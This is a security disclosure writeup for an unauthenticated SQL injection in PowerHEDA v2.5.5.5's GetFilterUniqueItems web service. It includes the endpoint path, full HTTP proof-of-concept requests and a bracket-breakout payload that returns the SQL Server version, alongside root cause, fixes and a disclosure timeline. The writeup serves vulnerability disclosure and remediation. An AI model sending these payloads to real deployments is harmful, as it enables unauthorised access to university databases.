# PowerHEDA v2.5.5.5 — Unauthenticated SQL Injection in `GetFilterUniqueItems`

- **Exploit Title**: PowerHEDA v2.5.5.5 - Unauthenticated SQL Injection (`GetFilterUniqueItems`)
- **Date**: 2026-09-02
- **Exploit Author**: Imraan Khan (Lich-Sec)
- **Vendor**: IDSC Consulting Pty (Ltd)
- **Vendor Homepage**: [https://www.heda.co.za/](https://www.heda.co.za/)
- **Product**: PowerHEDA (Higher Education Data Analyser)
- **Version**: 2.5.5.5 (build path `PowerHEDA V255`)
- **Tested On**: IIS / ASP.NET / Microsoft SQL Server
- **CVE**: Pending assignment
- **CWE**: CWE-89
- **CVSS v3.1**: 9.8 (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`)
- **Category**: WebApps

---

## Disclaimer

This issue was found during an authorised security assessment. The customer hostname is withheld. The proof below is **identity-only SQL**. It does not include operating-system command execution or extraction of student, staff, or academic records.

---

## Description

PowerHEDA v2.5.5.5 exposes a query-builder web service at `HedaDataRetrieval.asmx`. The `GetFilterUniqueItems` method takes a JSON body and interpolates the attacker-controlled `fColumn` value into a T-SQL **identifier** (column name).

A non-column value returns `Invalid column name '1'`. Closing the identifier with `]` and injecting a derived table executes attacker SQL as the application database principal.

**No application cookie, token, or registered user is required.** The same JSON POST succeeds with and without Forms Authentication.

Exception stacks on the tested build name IDSC product source, not a campus-only customisation:

```text
at heda_be.Data.db.GetData(...) in ...\heda_be\Data\db.vb:line 201
at PowerHEDA.QueryBuilderDataRetrieval.GetFilterUniqueItems(...)
   in ...\PowerHEDA V255\PowerHEDA\webservices\HedaDataRetrieval.asmx.vb:line 600
```

---

## Affected configuration

| Item | Value |
|------|--------|
| HTTP | `POST` JSON, `Content-Type: application/json` |
| Path (typical) | `/PowerHEDA/webservices/HedaDataRetrieval.asmx/GetFilterUniqueItems` |
| Body fields | `fColumn` (sink), `fKey`, `fWhere` |
| Auth | None observed on this method |
| Confirmed version | **2.5.5.5** (footer `PowerHEDA © 2019`; exception path `PowerHEDA V255`) |

`fKey` and `fWhere` are accepted by the method. **`fColumn` is the confirmed injection sink.** Sibling methods `GetQuickCriteriaValues` and `BuildFormulaBuilder` / `fSQL` were not raw SQL on this build and are not claimed here.

---

## Steps to Reproduce

Reproduce only on a lab instance or a host you are authorised to test. Do not run these requests against third-party universities.

### 1. Confirm identifier concatenation

```http
POST /PowerHEDA/webservices/HedaDataRetrieval.asmx/GetFilterUniqueItems HTTP/1.1
Host: <powerheda-host>
Content-Type: application/json; charset=utf-8
Accept: application/json

{"fColumn":"1","fKey":"5","fWhere":""}
```

**Expected:** HTTP `500` (server error). The body is a SQL exception:

```text
Invalid column name '1'.
```

The stack names `GetFilterUniqueItems` and `db.GetData` as above.

### 2. Confirm SQL execution (version string only)

The server treats `fColumn` as a bracketed identifier. A breakout of the form:

```text
x] FROM (SELECT @@VERSION AS [x]) t --
```

```http
POST /PowerHEDA/webservices/HedaDataRetrieval.asmx/GetFilterUniqueItems HTTP/1.1
Host: <powerheda-host>
Content-Type: application/json; charset=utf-8
Accept: application/json

{"fColumn":"x] FROM (SELECT @@VERSION AS [x]) t --","fKey":"5","fWhere":""}
```

**Expected:** HTTP `200` JSON containing the SQL Server version, for example:

```json
{"d":["Microsoft SQL Server ..."]}
```

(The exact edition string depends on the host.)

### 3. Confirm no login is required

Repeat step 2 **without** any `Cookie` header. On the tested build the JSON body is unchanged.

---

## Root cause

`GetFilterUniqueItems` concatenates `fColumn` into a statement of the form:

```sql
SELECT DISTINCT [fColumn] FROM ...
```

T-SQL identifiers cannot be parameterised the same way as literals. The fix is an **allow-list** of column names, or a quoted identifier built only from validated `[A-Za-z0-9_]` characters.

---

## Impact

A remote attacker who can reach the ASMX endpoint can run arbitrary SQL as the PowerHEDA database principal **without logging in**. That typically means read and alter of the application database. Additional impact (for example operating-system commands) depends on the customer SQL login’s rights and is a deployment issue, not a second product defect.

---

## Recommendation

1. Parameterise or allow-list `fColumn`. Do not concatenate client input into SQL identifiers.
2. Require authentication on `HedaDataRetrieval.asmx` query-builder methods.
3. Apply the vendor patch when IDSC publishes a fixed PowerHEDA build.
4. Until a patch is available, restrict the ASMX endpoint to an approved network.

---

## Disclosure timeline

| Date | Event |
|------|--------|
| 2026-09-02 | Vulnerability confirmed |
| 2026-10-15 | Vendor (IDSC) notified |
| Pending | CVE assignment / public record |

---

## References

- This writeup: https://github.com/stSLAYER/Lich-Sec/tree/main/CVE/PowerHEDA-GetFilterUniqueItems-SQLi
- Vendor product: https://www.heda.co.za/
